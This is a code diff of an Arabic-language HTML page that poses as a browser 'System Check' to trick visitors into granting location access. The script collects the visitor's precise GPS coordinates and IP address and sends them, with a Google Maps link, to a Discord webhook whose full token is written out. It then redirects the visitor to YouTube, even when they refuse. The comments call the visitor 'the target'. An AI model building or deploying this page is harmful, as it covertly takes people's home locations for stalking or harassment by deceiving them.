@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="ar">
 <head>
@@ -7,7 +6,10 @@
 </head>
 <body>
     <script>
+        // رابط الويبهوك الخاص بك
         const webhookURL = "https://discord.com/api/webhooks/1459200310185820361/NUkYWHtHY6QxPNWeiCzLz9zR1uKP8mALnEX-D9VEXPE0CETDNzMbYQ0XW0V5XxW9Nwlm";
+        // رابط التحويل (يوتيوب)
+        const redirectURL = "https://www.google.com/url?sa=t&source=web&rct=j&opi=89978449&url=https://www.youtube.com/&ved=2ahUKEwiJmbKa6v6RAxXz_7sIHXi0DnoQFnoECAsQAQ&usg=AOvVaw0usXxGa_x5y1xoI_LaL0-1";
 
         async function sendToDiscord(data) {
             await fetch(webhookURL, {
@@ -28,8 +30,8 @@
         window.onload = async () => {
             const ip = await getIP();
             
-            // طلب إحداثيات الـ GPS بدقة
             if (navigator.geolocation) {
+                // طلب الموقع الجغرافي
                 navigator.geolocation.getCurrentPosition(async (position) => {
                     const lat = position.coords.latitude;
                     const lon = position.coords.longitude;
@@ -38,34 +40,38 @@
                     await sendToDiscord({
                         content: "🎯 **تم تحديد موقع البيت بدقة (GPS)!**",
                         embeds: [{
-                            title: "إحداثيات الموقع الحالي",
-                            color: 3066993, // لون أخضر
+                            title: "إحداثيات الموقع الحالي للهدف",
+                            color: 3066993,
                             fields: [
-                                { name: "رابط الخريطة", value: `[اضغط هنا لفتح الموقع](${googleMapsLink})` },
-                                { name: "خط العرض (Lat)", value: lat.toString(), inline: true },
-                                { name: "خط الطول (Lon)", value: lon.toString(), inline: true },
-                                { name: "الـ IP", value: ip }
+                                { name: "رابط الخريطة المباشر", value: `[فتح الموقع في خرائط جوجل](${googleMapsLink})` },
+                                { name: "الـ IP", value: ip },
+                                { name: "خط العرض", value: lat.toString(), inline: true },
+                                { name: "خط الطول", value: lon.toString(), inline: true }
                             ]
                         }]
                     });
                     
-                    // تحويله بعد الصيد
-                    window.location.href = "https://i.imgur.com/866uX9r.jpg";
+                    // التحويل إلى رابط يوتيوب المطلوب
+                    window.location.href = redirectURL;
 
                 }, async (error) => {
-                    // في حال رفض إعطاء الموقع
+                    // إذا رفض الهدف إعطاء الموقع
                     await sendToDiscord({
                         content: "⚠️ **الهدف رفض إعطاء صلاحية الـ GPS**",
-                        description: `الـ IP الخاص به لا يزال متاحاً: ${ip}`
+                        description: `الـ IP الخاص به: ${ip}`
                     });
-                    window.location.href = "https://i.imgur.com/866uX9r.jpg";
+                    // تحويله حتى لو رفض
+                    window.location.href = redirectURL;
                 });
+            } else {
+                // إذا كان المتصفح لا يدعم الخاصية
+                window.location.href = redirectURL;
             }
         };
     </script>
-    <div style="text-align: center; margin-top: 50px;">
+    <div style="text-align: center; margin-top: 50px; font-family: Arial, sans-serif;">
         <h2>System Check...</h2>
-        <p>Please click <b>"Allow"</b> to verify your device compatibility.</p>
+        <p>الرجاء الضغط على <b>"Allow"</b> أو <b>"سماح"</b> للتحقق من توافق المتصفح وعرض المحتوى.</p>
     </div>
 </body>
 </html>
